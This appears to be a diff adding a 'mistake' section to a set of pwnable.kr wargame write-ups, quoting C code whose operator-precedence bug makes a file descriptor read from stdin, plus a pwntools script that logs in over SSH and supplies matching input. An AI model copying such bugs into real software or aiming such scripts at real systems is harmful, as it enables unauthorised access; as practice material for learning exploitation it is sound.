@@ -193,3 +193,27 @@ p.sendline("3039230856") # Always rand() is 0x6b8b4567 because the code didn't s
 print(p.recvall())
 ```
 
+## mistake
+
+#### Part of the code
+```c
+int fd;
+	if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0){
+		printf("can't open password %d\n", fd);
+		return 0;
+	}
+
+```
+
+#### Solution
+```python
+from pwn import *
+
+vm = ssh("mistake", "pwnable.kr", 2222, "guest")
+
+p = vm.process("./mistake")
+p.sendline("B"*10) # the "fd=open("/home/mistake/password",O_RDONLY,0400) < 0" makes the fd = 0 (because "<" has higher priority than "=")
+p.sendline("C"*10)
+
+p.interactive()
+```
